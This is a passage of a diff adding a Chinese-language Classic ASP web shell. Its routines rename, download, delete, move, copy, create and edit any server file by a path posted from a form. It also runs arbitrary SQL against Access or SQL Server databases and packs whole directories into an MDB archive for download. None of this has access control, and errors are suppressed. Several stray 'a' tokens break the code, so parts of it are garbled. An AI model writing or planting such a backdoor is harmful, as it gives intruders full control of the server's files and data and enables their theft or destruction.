+		echo "移动选中文件(夹)到<br/><input value=""" & HtmlEncode(thePath) & """ name=MoveTo><br/><input type=button value='移动' onclick=Command('move');><hr style='color:#d8d8f0;'/>"
+		echo "复制选中文件(夹)到<br/><input value=""" & HtmlEncode(thePath) & """ name=CopyTo><br/><input type=button value='复制' onclick=Command('copy');><hr style='color:#d8d8f0;'/>"
+		echo "</td></tr><tr>"
+		echo "<td colspan=2 class=trHead>&nbsp;</td>"
+		echo "</tr>"
+		echo "<tr align=right>"
+		echo "<td colspan=2 class=td>"&VerName&"&nbsp;</td>"
+		echo "</tr>"
+		echo "</form>"
+		echo "</table>"
+		
+		Set theFolder = Nothing
+	End Sub
+	
+	Sub RenOne()
+		Dim objX, strPath, aryParam, isFile, isFolder
+		If isDebugMode = False Then On Error Resume Next
+		aryParam = Split(GetPost("param"), ",")
+		strPath = GetPost("truePath") & "\"
+		aryParam(0) = strPath & aryParam(0)
+		isFile = fso.FileExists(aryParam(0))
+		isFolder = fso.FolderExists(aryParam(0))
+
+		If isFile = False And isFolder = False Then
+			ShowErr("文件(夹)不存在或者不允许访问!")
+		End If
+        a
+		If isFile = False Then
+			Set objX = fso.GetFolder(aryParam(0))
+			objX.Name = aryParam(1)
+		 Else
+			Set objX = fso.GetFile(aryParam(0))
+			objX.Name = aryParam(1)
+		End If
+		Set objX = Nothing
+
+		ChkErr(Err)
+	End Sub
+
+	Sub DownTheFile()
+		Response.Clear
+		Dim stream, strPath, fileContentType
+		If isDebugMode = False Then On Error Resume Next
+		strPath = GetPost("truePath") & "\" & GetPost("param")
+        a
+		Set stream = Server.CreateObject("adodb.stream")
+		stream.Open
+		stream.Type = 1
+		stream.LoadFromFile(strPath)
+		ChkErr(Err)
+		Response.AddHeader "Content-Disposition", "Attachment; Filename=" & GetPost("param")
+		Response.AddHeader "Content-Length", stream.Size
+		Response.Charset = "UTF-8"
+		Response.ContentType = "Application/Octet-Stream"
+		Response.BinaryWrite stream.Read 
+		Response.Flush
+		stream.Close
+		Set stream = Nothing
+	End Sub
+	
+	Sub DelOne()
+		Dim objX, strPath
+		If isDebugMode = False Then On Error Resume Next
+		strPath = GetPost("truePath") & "\"
+		For Each objX In Request.Form("checkBox")
+			If fso.FolderExists(strPath & objX) = True Then
+				Call fso.DeleteFolder(strPath & objX, True)
+				ChkErr(Err):a
+			Else
+				If fso.FileExists(strPath & objX) = True Then
+					Call fso.DeleteFile(strPath & objX, True)
+					ChkErr(Err)
+				End If
+			End If
+		Next
+	End Sub
+
+	Sub MoveCopyOne()
+		Dim objX, strPath, strMoveTo, strCopyTo
+		If isDebugMode = False Then On Error Resume Next
+		strMoveTo = GetPost("MoveTo")
+		strCopyTo = GetPost("CopyTo")
+		strPath = GetPost("truePath") & "\"
+		If theAct = "move" Then
+			strMoveTo = strMoveTo & "\"
+		 Else
+			strCopyTo = strCopyTo & "\"
+		End If
+
+		For Each objX In Request.Form("checkBox")
+			If theAct = "move" Then
+				If InStr(strMoveTo, strPath & objX) > 0 Then
+					ShowErr("目标文件夹不能在源文件夹内")
+				End If
+				If fso.FileExists(strPath & objX) = True Then
+					Call fso.MoveFile(strPath & objX, strMoveTo & objX)
+				 Else
+					Call fso.MoveFolder(strPath & objX, strMoveTo & objX)
+				End If
+			 Else
+				If InStr(strCopyTo, strPath & objX) > 0 Then
+					ShowErr("目标文件夹不能在源文件夹内")
+				End If
+				If fso.FileExists(strPath & objX) = True Then
+					Call fso.CopyFile(strPath & objX, strCopyTo & objX)
+				 Else
+					Call fso.CopyFolder(strPath & objX, strCopyTo & objX)
+				End If
+			End If
+			ChkErr(Err)
+		Next
+	End Sub
+
+	Sub NewOne()
+		Dim objX, strPath, aryParam
+		If isDebugMode = False Then On Error Resume Next
+		aryParam = Split(GetPost("param"), ",")
+		strPath = GetPost("truePath") & "\" & aryParam(0)
+
+		If aryParam(1) = "file" Then
+			Call fso.CreateTextFile(strPath, False)
+		 Else
+			fso.CreateFolder(strPath)
+		End If
+	End Sub
+	
+	Sub ShowEdit()
+		Dim theFile, strPath
+		If isDebugMode = False Then On Error Resume Next
+		strPath = GetPost("truePath") & "\" & GetPost("param")
+		If Right(strPath, 1) = "\" Then strPath = Left(strPath, Len(strPath) - 1)
+		Set theFile = fso.OpenTextFile(strPath, 1, False)
+		ChkErr(Err):a
+		echo "<table width=970 height=100% border=0 cellpadding=0 cellspacing=0>"
+		echo "<tr>"
+		echo "<td class=td><font face=webdings>8</font> FSO文本编辑器</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td class=trHead>&nbsp;</td>"
+		echo "</tr>"
+		echo "<form method=post action=" & url & ">"
+		echo "<input type=hidden name=theAct>"
+		echo "<input type=hidden value=PageFso name=PageName>"
+		echo "<tr>"
+		echo "<td height=22>&nbsp;<input name=truePath value=""" & strPath & """ style=width:500px;>"
+		echo "<input type=submit value=查看 onClick=this.form.theAct.value='showedit';></td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td>&nbsp;<textarea name=fileContent style='width:735px;height:100%;'>"
+		echo HtmlEncode(theFile.ReadAll())
+		echo "</textarea></td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td class=trHead>&nbsp;</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td class=td align=center><input type=button name=Submit value=保存 onClick=""if(confirm('确认保存修改?')){this.form.theAct.value='save';this.form.submit();}"">"
+		echo "<input type=reset value=重置><input type=button onclick=window.close(); value=关闭>"
+'		echo "<input type=button value=查看 title='在新窗口中打开该文件链接' onclick=preView('2');>"
+		echo "<input type=button value=预览 onclick=preView('1'); title='以HTML方式在新窗口中预览当前代码'></td>"
+		echo "</tr>"
+		echo "</form>"
+		echo "</table>"
+
+		Set theFile = Nothing
+	End Sub
+	
+	Sub SaveToFile()
+		Dim theFile, strPath, fileContent
+		If isDebugMode = False Then On Error Resume Next
+		fileContent = GetPost("fileContent")
+		strPath = GetPost("truePath")
+
+		Set theFile = fso.OpenTextFile(strPath, 2, True)
+		theFile.Write fileContent
+		theFile.Close
+		ChkErr(Err)
+		
+		Set theFile = Nothing
+	End Sub
+	
+	Sub SaveAs()
+		Dim strPath, aryParam, isFile
+		If isDebugMode = False Then On Error Resume Next
+		aryParam = Split(GetPost("param"), ",")
+		aryParam(0) = aryParam(0)
+		aryParam(1) = aryParam(1)
+		isFile = fso.FileExists(aryParam(0))
+		
+		If isFile = True Then
+			fso.CopyFile aryParam(0), aryParam(1), False
+		 Else
+			fso.CopyFolder aryParam(0), aryParam(1), False
+		End If
+		
+		ChkErr(Err)
+	End Sub
+
+	Sub ShowImage()
+		Dim stream, strPath, fileContentType
+		If isDebugMode = False Then On Error Resume Next
+		strPath = GetPost("truePath") & "\" & GetPost("param")
+
+		Set stream = Server.CreateObject("adodb.stream")
+		stream.Open
+		stream.Type = 1
+		stream.LoadFromFile(strPath)
+		ChkErr(Err)
+		Response.Clear
+		Response.BinaryWrite stream.Read 
+		stream.Close
+
+		Set stream = Nothing
+	End Sub
+
+	Sub PageDBTool()
+		ShowTitle("Access + SQL Server 数据库操作")
+		echo "<form method=post action=""" & url & """>"
+
+		If theAct <> "" And theAct <> "Query" And theAct <> "ShowTables" Then
+			SqlShowEdit()
+			echo "</form>"
+			Response.End()
+		End If
+
+		ShowDBTool()
+		
+		Select Case theAct
+			Case "Query"
+				ShowQuery()
+			Case "ShowTables"
+				ShowTables()
+		End Select
+		
+		echo "</form>"
+	End Sub
+
+	Sub ShowDBTool()
+		echo "<table width=970>"
+		echo "<input type=hidden value=PageDBTool name=PageName>"
+		echo "<input type=hidden name=theAct>"
+		echo "<input type=hidden name=param>"
+		echo "<tr>"
+		echo "<td class=td><font face=webdings>8</font> Access + SQL Server 数据库操作</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td class=trHead>&nbsp;</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td height=50 align=center>"
+		echo "<input name=thePath type=text id=thePath value=""" & HtmlEncode(thePath) & """ size=60>"
+		echo "</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td class=trHead>&nbsp;</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td align=center class=td>"
+		echo "<input type=submit name=Submit value=提交 onclick=""this.form.theAct.value='ShowTables';"">"
+		echo "<input type=button value=MDB onclick=""this.form.thePath.value='DataSource;UserName;PassWord;';"">"
+		echo "<input type=button value=SQL onclick=""this.form.thePath.value='sql:Provider=SQLOLEDB.1;Server=(local);User ID=UserName;Password=PassWord;Database=Pubs;';"">"
+		echo "<input type=reset value=重置>"
+		echo "</td>"
+		echo "</tr>"
+		echo "</table>"
+	End Sub
+
+	Sub ShowTables()
+		Dim Cat, objTable, objColumn, intColSpan, objSchema
+		If isDebugMode = False Then On Error Resume Next
+
+		echo "<br/><table width=970>"
+		echo "<tr>"
+		echo "<td class=td colspan=2><font face=webdings>8</font> 数据表及结构查看</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td colspan=2 class=trHead>&nbsp;</td>"
+		echo "</tr>"
+		
+		CreateConn()
+		Set Cat = Server.CreateObject("ADOX.Catalog")
+		Cat.ActiveConnection = conn.ConnectionString
+		echo "<tr><td width='20%' valign=top>"
+		For Each objTable In Cat.Tables
+			echo "<span class=fixSpan title='" & objTable.Name & "' onclick=""Command('Query',this.title);this.disabled=true;"" "
+			echo "style='width:94%;padding-left:8px;cursor:hand;'>" & objTable.Name & "</span>"
+		Next
+		echo "</td><td>"
+		intColSpan = IIf(isSqlServer = True, "4", "6")
+		
+		For Each objTable In Cat.Tables
+			echo "<table width=98% align=center>"
+			echo "<tr>"
+			echo "<td class=trHead colspan=" & intColSpan & ">&nbsp;</td>"
+			echo "</tr>"
+			echo "<tr>"
+			echo "<td colspan=" & intColSpan & " class=td>&nbsp;<strong>"
+			echo objTable.Name & "</strong></td>"
+			echo "</tr>"
+			
+			echo "<tr align=center>"
+			echo "<td align=left width=*>&nbsp;列名</td>"
+			echo "<td width=80>类型</td>"
+			echo "<td width=60>大小</td>"
+			echo "<td width=60>可否为空</td>"
+			If isSqlServer = False Then
+				echo "<td width=50>默认值</td>"
+				echo "<td width=100>描述</td>"
+			End If
+			echo "</tr>"
+			
+			For Each objColumn In Cat.Tables(objTable.Name).Columns
+				echo "<tr align=center>"
+				echo "<td align=left><span style='width:98%;padding-left:5px;'>" & objColumn.Name & "</a></td>"
+				echo "<td>" & GetDataType(objColumn.Type) & "</td>"
+				If objColumn.DefinedSize <> 0 Then
+					echo "<td>" & objColumn.DefinedSize & "</td>"
+				 Else
+					echo "<td>" & IIf(objColumn.Precision <> 0, objColumn.Precision, "&nbsp;") & "</td>"
+				End If
+				echo "<td>" & IIf(objColumn.Attributes = 1, "False", "True") & "</td>"
+				If isSqlServer = False Then
+					echo "<td><span class=fixSpan style='width:40px;padding-left:5px;' title=""" & HtmlEncode(objColumn.Properties("Default").value) & """>"
+					echo HtmlEncode(objColumn.Properties("Default").value) & "</span></td>"
+					echo "<td align=left><span class=fixSpan style='width:95px;padding-left:5px;' title=""" & objColumn.Properties("Description") & """>"
+					echo objColumn.Properties("Description") & "</span></td>"
+				End If
+				echo "</tr>"
+			Next
+
+			echo "<tr>"
+			echo "<td colspan=" & intColSpan & " class=td>&nbsp;</td>"
+			echo "</tr>"
+			echo "</table><br/>"
+		Next
+
+		echo "</td>"
+		echo "</tr>"
+
+		echo "<tr>"
+		echo "<td colspan=2 class=trHead>&nbsp;</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td colspan=2 class=td align=right>"&VerName&"&nbsp;</td>"
+		echo "</tr>"
+		echo "</table>"
+		
+		Set Cat = Nothing
+		DestoryConn()
+	End Sub
+
+	Sub ShowQuery()
+		Dim i, j, x, rs, sql, sqlB, sqlC, Cat, intPage, objTable, strParam, strTable, strPrimaryKey
+		If isDebugMode = False Then On Error Resume Next
+		sql = GetPost("sql")
+		strParam = GetPost("param")
+		strTable = GetPost("theTable")
+		Set rs = Server.CreateObject("Adodb.RecordSet")
+
+		If IsNumeric(strParam) = True Then
+			intPage = strParam
+		 Else
+			intPage = 1
+			strTable = strParam
+			sql = ""
+		End If
+		If sql = "" Then
+			sql = "Select * From [" & strTable & "]"
+		End If
+
+		For i = 1 To Request.Form("KeyWord").Count
+			If Request.Form("KeyWord")(i) <> "" Then
+				sqlC = Replace(Request.Form("KeyWord")(i), "'", "''")
+				sqlC = IIf(Request.Form("JoinTag")(i) = " like ", "'" & sqlC & "'", sqlC)
+				sqlB = sqlB & "[" & Request.Form("Fields")(i) & "]" & Request.Form("JoinTag")(i) & sqlC & Request.Form("JoinTag2")(i)
+			End If
+		Next
+		If sqlB <> "" Then
+			sql = "Select * From [" & strTable & "] Where " & sqlB
+			If Right(sql, 4) = " Or " Then sql = Left(sql, Len(sql) - 4)
+			If Right(sql, 5) = " And " Then sql = Left(sql, Len(sql) - 5)
+		End If
+
+		echo "<input type=hidden name=sql value=""" & HtmlEncode(sql) & """>"
+		echo "<textarea name=sqlB rows=1 style='width:647px;'>" & HtmlEncode(sql) & "</textarea>"
+		echo " <input type=button value=执行查询 onclick=""this.form.sql.value=this.form.sqlB.value;Command('Query','0');"">"
+		echo "<input type=button value=- onclick='if(this.form.sqlB.rows>3)this.form.sqlB.rows-=3;'>"
+		echo "<input type=button value=+ onclick='this.form.sqlB.rows+=3;'>"
+		echo "<input type=hidden name=theTable value=""" & HtmlEncode(strTable) & """>"
+		echo "<br/><table width=970>"
+		echo "<tr>"
+		echo "<td class=td colspan=2><font face=webdings>8</font> SQL查询器</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td colspan=2 class=trHead>&nbsp;</td>"
+		echo "</tr>"
+
+		CreateConn()
+		Set Cat = Server.CreateObject("ADOX.Catalog")
+		Cat.ActiveConnection = conn.ConnectionString
+		echo "<tr><td width='20%' valign=top>"
+		For Each objTable In Cat.Tables
+			echo "<span class=fixSpan title='" & objTable.Name & "' onclick=""Command('Query',this.title);this.disabled=true;"" "
+			echo "style='width:94%;padding-left:8px;cursor:hand;'>"
+			If strTable = objTable.Name Then
+				echo "<u>" & objTable.Name & "</u>"
+			 Else
+				echo objTable.Name
+			End If
+			echo "</span>"
+		Next
+		echo "</td><td valign=top>"
+
+		If LCase(Left(sql, 7)) = "select " Then
+			rs.Open sql, conn, 1, 1
+			ChkErr(Err)
+			rs.PageSize = PageSize
+			If Not rs.Eof Then
+				rs.AbsolutePage = intPage
+			End If
+	
+			echo "<div align=left><table border=1 width=490>"
+			echo "<tr>"
+			echo "<td height=22 class=trHead>&nbsp;</td>"
+			echo "</tr>"
+			echo "<tr>"
+			echo "<td height=22 class=td width=100>&nbsp;查询</td>"
+			echo "</tr><tr><td align=center>"
+			echo "<div><select name=Fields>"
+			For Each x In rs.Fields
+				echo "<option value=""" & x.Name & """>" & x.Name & "</option>"
+			Next
+			echo "</select>"
+			echo "<select name=JoinTag><option value=' like '>like</option><option value='='>=</option></select>"
+			echo "<input name=KeyWord style='width:200px;'>"
+			echo "<select name=JoinTag2><option value=' And '>And</option><option value=' Or '>Or</option></select> "
+			echo "<input type=button value=+ onclick=""this.parentElement.outerHTML+='<div>'+this.parentElement.innerHTML+'</div>';"">"
+			echo "<input type=button value=- onclick=""this.parentElement.outerHTML='';""></div> "
+			echo "<input type=button value=查询 onclick=this.form.sql.value='';this.form.param.value='1';this.form.theAct.value='Query';this.form.submit();>"
+			echo "</td></tr>"
+			echo "<tr><td class=td>&nbsp;</td></tr>"
+			echo "</table></div><br/>"
+			
+			If rs.Fields.Count > 0 Then
+				strPrimaryKey = GetPrimaryKey(strTable)
+	
+				echo "<table border=1 align=left cellpadding=0 cellspacing=0>"
+				echo "<tr>"
+				echo "<td height=22 class=trHead colspan=" & rs.Fields.Count + 1 & ">&nbsp;</td>"
+				echo "</tr>"
+				echo "<tr>"
+				echo "<td height=22 class=td width=100 align=center>操作</td>"
+				For j = 0 To rs.Fields.Count - 1
+					echo "<td height=22 class=td width=130><span class=fixSpan title='" & rs.Fields(j).Name & "' style='width:125px;padding-left:5px;'>" & rs.Fields(j).Name & "</span></td>"
+				Next
+				For i = 1 To rs.PageSize
+					If rs.Eof Then Exit For
+					echo "</tr>"
+					echo "<tr valign=top>"
+					echo "<td height=22 align=center>"
+					If strPrimaryKey <> "" Then
+						echo "<input type=button value=编辑 title='编辑/添加' onclick=showSqlEdit('" & strPrimaryKey & "','" & rs(strPrimaryKey) & "');>"
+						echo "<input type=button value=删除 onclick=sqlDelete('" & strPrimaryKey & "','" & rs(strPrimaryKey) & "');></td>"
+					 Else
+						echo "<input type=button value=编辑 title='编辑/添加' onclick=alert('主键不存在,操作有可能导致重大数据库灾难,并且该操作不可逆!');showSqlEdit('" & rs.Fields(0).Name & "','" & rs(rs.Fields(0).Name) & "');>"
+						echo "<input type=button value=删除 onclick=alert('主键不存在,操作有可能导致重大数据库灾难,并且该操作不可逆!');sqlDelete('" & rs.Fields(0).Name & "','" & rs(rs.Fields(0).Name) & "');></td>"
+					End If
+					For j = 0 To rs.Fields.Count - 1
+						echo "<td height=22><span class=fixSpan style='width:125px;padding-left:5px;'>" & HtmlEncode(IIf(Len(rs(j)) > 50, Left(rs(j), 50), rs(j))) & "</span></td>"
+					Next
+					echo "</tr>"
+					rs.MoveNext
+				Next
+			End If
+			echo "<tr>"
+			echo "<td height=22 class=td colspan=" & rs.Fields.Count + 1 & ">&nbsp;Page: "
+			For i = 1 To rs.PageCount
+				If i > maxPageCount Then
+					echo "..."
+					Exit For
+				End If
+				echo Replace("<a href=javascript:Command('Query','" & i & "');><font {$font" & i & "}>" & i & "</font></a> ", "{$font" & intPage & "}", " color=red")
+			Next
+			echo "</td></tr></table>"
+			rs.Close
+		 Else
+			conn.Execute(sql)
+			ChkErr(Err)
+			echo "<script>alert('查询执行成功,按确定返回.\n刷新后可以看到执行效果.');history.back();</script>"
+			Set rs = Nothing
+			Set Cat = Nothing
+			DestoryConn()
+			Exit Sub
+		End If
+		echo "</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td colspan=2 class=trHead>&nbsp;</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td colspan=2 class=td align=right>"&VerName&"&nbsp;</td>"
+		echo "</tr>"
+		echo "</table>"
+		
+		Set rs = Nothing
+		Set Cat = Nothing
+		DestoryConn()
+	End Sub
+
+	Sub SqlShowEdit()
+		Dim intFindI, intFindJ, intFindK, intFindL, intFindM, strJoinTag, multiTables
+		Dim i, x, rs, sql, strTable, strExtra, strParam, intI, strColumn, strValue, strPrimaryKey
+		If isDebugMode = False Then On Error Resume Next
+		sql = GetPost("sql")
+		strParam = GetPost("param")
+		strTable = GetPost("theTable")
+		intI = InStr(strParam, "!")
+		intFindI = InStr(LCase(sql), " where")
+		intFindJ = InStrRev(LCase(sql), "order ")
+		intFindK = IIf(LCase(Right(sql, 4)) = "desc", "1", "0")
+		strValue = Mid(strParam, intI + 1)
+		strColumn = Left(strParam, intI - 1)
+		strExtra = IIf(theAct = "next", ">", IIf(theAct = "pre", "<", ""))
+		
+		If intFindJ > 0 Then sql = Left(sql, intFindJ - 1)
+		If intFindI > 0 Then
+			strJoinTag = ") And "
+			sql = Left(sql, intFindI + 5) & "(" & Mid(sql, intFindI + 6)
+		 Else
+			strJoinTag = " Where "
+		End If
+		If intFindK > 0 Then strExtra = IIf(strExtra = ">", "<", IIf(strExtra = "<", ">", ""))
+
+		CreateConn()
+		strPrimaryKey = GetPrimaryKey(strTable)
+		Set rs = Server.CreateObject("Adodb.RecordSet")
+
+		If strExtra <> "" And IsNumeric(strValue) = True Then
+			sql = "Select Top 1" & Mid(sql, 7) & strJoinTag
+			sql = sql & strColumn & " " & strExtra & " " & strValue & " Order By " & strColumn & IIf(strExtra = "<", " Desc", " Asc")
+		 Else
+			sql = sql & strJoinTag & strColumn & " like '" & Replace(strValue, "'", "''") & "'"
+		End If
+
+		intFindM = InStr(LCase(sql), "from")
+		intFindI = InStr(LCase(sql), " where")
+		intFindL = InStr(intFindM, LCase(sql), ",", 1)
+		If intFindL > 0 Then
+			If (intFindL > intFindM) And (intFindL < intFindI) Then
+				multiTables = True
+			End If
+		End If
+		
+		If theAct <> "edit" Then
+			rs.Open sql, conn, 1, 3
+			ChkErr(Err)
+			If rs.Eof Then
+				echo "<script>alert('该记录不存在!');history.back();</script>"
+				Response.End()
+			End If
+
+			If theAct = "new" Then rs.AddNew
+
+			If theAct = "del" Then
+				rs.Delete
+				rs.Update
+				AlertThenClose("删除成功!")
+				Response.End
+			 Else
+				If theAct <> "pre" And theAct <> "next" Then
+					For Each x In rs.Fields
+						If strPrimaryKey <> x.Name Then
+							rs(x.Name) = Request.Form(x.Name & "_Column")
+						End If
+					Next
+					rs.Update
+				End If
+				strValue = rs(strColumn)
+			End If
+
+			If theAct = "new" Then
+				sql = "Select * From [" & strTable & "] Where " & strColumn & " like '" & Replace(strValue, "'", "''") & "'"
+			End If
+			rs.Close
+		End If
+
+		rs.Open sql, conn, 1, 1
+
+		echo "<table border=1 width=600>"
+		echo "<tr>"
+		echo "<td height=22 class=trHead colspan=2>&nbsp;</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td colspan=2 class=td><font face=webdings>8</font> SQL数据修改</td>"
+		echo "</tr>"
+		echo "<input type=hidden value=PageDBTool name=PageName>"
+		echo "<input type=hidden name=theAct value=save>"
+		echo "<input type=hidden name=sql value=""" & HtmlEncode(GetPost("sql")) & """>"
+		echo "<input type=hidden name=theTable value=""" & strTable & """>"
+		echo "<input type=hidden value=""" & HtmlEncode(strColumn & "!" & strValue) & """ name=param>"
+		echo "<input type=hidden value=""" & HtmlEncode(GetPost("thePath")) & """ name=thePath>"
+
+		For Each x In rs.Fields
+			echo "<tr>"
+			echo "<td height=22 width=150>&nbsp;" & HtmlEncode(x.Name) & "<br/>&nbsp;(<em>" & GetDataType(x.Type) & "</em>)</td>"
+			echo "<td width=450>&nbsp;"
+			echo "<textarea style='width:436;' name=""" & x.Name & "_Column""" & IIf(x.Type = 201 Or x.Type = 203, " rows=6", "")
+			echo IIf(x.Properties("ISAUTOINCREMENT").Value, " disabled", "") 
+			echo IIf(x.Name = strPrimaryKey, " title='主键,由于主键约束,将无法被修改,也不能出现相同值.'", "") & ">" & HtmlEncode(x.value) & "</textarea>"
+			echo "</td></tr>"
+		Next
+		echo "<tr>"
+		echo "<td colspan=2 class=td align=center>"
+		If multiTables = False Then
+			If strPrimaryKey = "" Then
+				echo "<input type=button value=修改 onclick=if(confirm('确定要修改这条记录吗?\n此表没有主键,继续操作可能会导致数据库灾难,并且该错误无法被撤消.')){this.form.theAct.value='save';this.form.submit();}>"
+			 Else
+				echo "<input type=submit value=修改 onclick=this.form.theAct.value='save';>"
+				echo "<input type=button value=添加 onclick=if(confirm('确实要添加当前为新记录吗?')){this.form.theAct.value='new';this.form.submit();};>"
+				echo "<input type=button value=删除 onclick=if(confirm('确实删除当前记录吗?')){this.form.theAct.value='del';this.form.submit();};>"
+			End If
+		 Else
+			echo "<input type=button value=暂不支持多表操作 disabled>"
+		End If
+		echo "<input type=reset value=重置><input type=button value=关闭 onclick='window.close();'>"
+		If IsNumeric(strValue) = True Then
+			echo "<input type=button value=上一条 onclick=""this.form.theAct.value='pre';this.form.submit();"">"
+			echo "<input type=button value=下一条 onclick=""this.form.theAct.value='next';this.form.submit();"">"
+		End If
+		echo "</td>"
+		echo "</tr>"
+		echo "</table>"
+		
+		rs.Close
+		Set rs = Nothing
+		DestoryConn()
+	End Sub
+
+	Sub CreateConn()
+		Dim connStr, mdbInfo, userName, passWord, strPath
+		If isDebugMode = False Then On Error Resume Next
+		Set conn = Server.CreateObject("Adodb.Connection")
+		If LCase(Left(thePath, 4)) = "sql:" Then
+			connStr = Mid(thePath, 5)
+			isSqlServer = True
+		 Else
+			mdbInfo = Split(thePath, ";")
+			strPath = mdbInfo(0)
+			strPath = strPath
+			ChkErr(Err)
+			If UBound(mdbInfo) >= 2 Then
+				userName = mdbInfo(1)
+				passWord = mdbInfo(2)
+			End If
+			connStr = Replace(accessStr, "{$dbSource}", strPath)
+			connStr = Replace(connStr, "{$userId}", userName)
+			connStr = Replace(connStr, "{$passWord}", passWord)
+		end if
+		conn.Open connStr
+		ChkErr(Err)
+	End Sub
+	
+	Sub DestoryConn()
+		conn.Close
+		Set conn = Nothing
+	End Sub
+	
+	Function GetDataType(flag)
+		Dim str
+		Select Case flag
+			Case 0 : str = "EMPTY"
+			Case 2 : str = "SMALLINT"
+			Case 3 : str = "INTEGER"
+			Case 4 : str = "SINGLE"
+			Case 5 : str = "DOUBLE"
+			Case 6 : str = "CURRENCY"
+			Case 7 : str = "DATE"
+			Case 8 : str = "BSTR"
+			Case 9 : str = "IDISPATCH"
+			Case 10 : str = "ERROR"
+			Case 11 : str = "BIT"
+			Case 12 : str = "VARIANT"
+			Case 13 : str = "IUNKNOWN"
+			Case 14 : str = "DECIMAL"
+			Case 16 : str = "TINYINT"
+			Case 17 : str = "UNSIGNEDTINYINT"
+			Case 18 : str = "UNSIGNEDSMALLINT"
+			Case 19 : str = "UNSIGNEDINT"
+			Case 20 : str = "BIGINT"
+			Case 21 : str = "UNSIGNEDBIGINT"
+			Case 72 : str = "GUID"
+			Case 128 : str = "BINARY"
+			Case 129 : str = "CHAR"
+			Case 130 : str = "WCHAR"
+			Case 131 : str = "NUMERIC"
+			Case 132 : str = "USERDEFINED"
+			Case 133 : str = "DBDATE"
+			Case 134 : str = "DBTIME"
+			Case 135 : str = "DBTIMESTAMP"
+			Case 136 : str = "CHAPTER"
+			Case 200 : str = "VARCHAR"
+			Case 201 : str = "LONGVARCHAR"
+			Case 202 : str = "VARWCHAR"
+			Case 203 : str = "LONGVARWCHAR"
+			Case 204 : str = "VARBINARY"
+			Case 205 : str = "LONGVARBINARY"
+			Case Else : str = flag
+		End Select
+		GetDataType = str
+	End Function
+	
+	Function GetPrimaryKey(strTable)
+		Dim rsPrimary
+		If isDebugMode = False Then On Error Resume Next
+		Set rsPrimary = conn.OpenSchema(28, Array(Empty, Empty, strTable))
+		If Not rsPrimary.Eof Then GetPrimaryKey = rsPrimary("COLUMN_NAME")
+		Set rsPrimary = Nothing
+	End Function
+
+	Sub PagePack()
+		ShowTitle("文件夹打包/解开器")
+		Server.ScriptTimeOut = 5000
+		
+		If theAct = "PackIt" Or theAct = "PackOne" Then
+			PackIt()
+			AlertThenClose("打包成功!生成为该文件夹目录下的" & sPacketName & "文件.\n下载下来后可以使用unpack.vbs进行解开.")
+			Response.End()
+		End If
+		If theAct = "UnPack" Then
+			UnPack()
+			AlertThenClose("解开成功!解开目录为" & sPacketName & "所在目录.")
+			Response.End()
+		End If
+		
+		PackTable()
+	End Sub
+	
+	Sub PackTable()
+		echo "<base target=_blank>"
+		echo "<table width=970 border=1>"
+		echo "<tr>"
+		echo "<td colspan=2 class=td><font face=webdings>8</font> 文件夹打包/解开器(需FSO支持)"
+		echo "</td>"
+		echo "</tr>"
+		echo "<tr>"
+
+		echo "<td colspan=2 class=trHead>&nbsp;</td>"
+		echo "</tr>"
+		echo "<form method=post action='" & url & "'>"
+		echo "<tr>"
+		echo "<td width='20%'>&nbsp;打包</td>"
+		echo "<td>&nbsp;<input name=thePath value='" & HtmlEncode(rootPath) & "' style='width:467px;'> "
+		echo "<input type=hidden value=PagePack name=PageName>"
+		echo "<input type=hidden value=PackIt name=theAct>"
+		echo "<input type=submit value='开始打包'>"
+		echo "</td></tr>"
+		echo "</form>"
+		echo "<form method=post action='" & url & "'>"
+		echo "<tr>"
+		echo "<td>&nbsp;解包</td>"
+		echo "<td>&nbsp;<input name=thePath value=""" & HtmlEncode(sPacketName) & """ style='width:467px;'> "
+		echo "<input type=hidden value=PagePack name=PageName>"
+		echo "<input type=hidden value=UnPack name=theAct>"
+		echo "<input type=submit value='开始解包'>"
+		echo "</td></tr>"
+		echo "</form>"
+		echo "<tr>"
+		echo "<td colspan=2 class=trHead>&nbsp;</td>"
+		echo "</tr>"
+		echo "<tr align=right>"
+		echo "<td colspan=2 class=td>"&VerName&"&nbsp;</td>"
+		echo "</tr>"
+		echo "</table>"
+	End Sub
+
+	Sub PackIt()
+		Dim rs, db, conn, stream, connStr, objX, strPath, strPathB, isFolder, adoCatalog
+		If isDebugMode = False Then On Error Resume Next
+
+		strPath = thePath
+		db = strPath & "\" & sPacketName
+		Set rs = Server.CreateObject("ADODB.RecordSet")
+		Set stream = Server.CreateObject("ADODB.Stream")
+		Set conn = Server.CreateObject("ADODB.Connection")
+		Set adoCatalog = Server.CreateObject("ADOX.Catalog")
+		connStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & db
+
+		If fso.FolderExists(strPath) = False Then
+			ShowErr(thePath & " 目录不存在或者不允许访问!")
+		End If
+		If theAct = "PackIt" Then
+			If fso.GetFolder(strPath).Size > 300 * 1024 * 1024 Then
+				ShowErr("该目录超过300M, 可能造成服务器当机, 操作停止.")
+			End If
+		End If
+		If fso.FileExists(db) = False Then
+			adoCatalog.Create connStr
+			conn.Open connStr
+			conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")
+		 Else
+			conn.Open connStr
+		End If
+		
+		stream.Open
+		stream.Type = 1
+		rs.Open "FileData", conn, 3, 3
+
+		If theAct = "PackIt" Then
+			Call FsoTreeForMdb(strPath, rs, stream)
+		 Else
+		 	strPath = GetPost("truePath") & "\"
+			For Each objX In Request.Form("checkBox")
+				strPathB = strPath & objX
+				isFolder = fso.FolderExists(strPathB)
+				If isFolder = True Then
+					Call FsoTreeForMdb(strPathB, rs, stream)
+				 Else
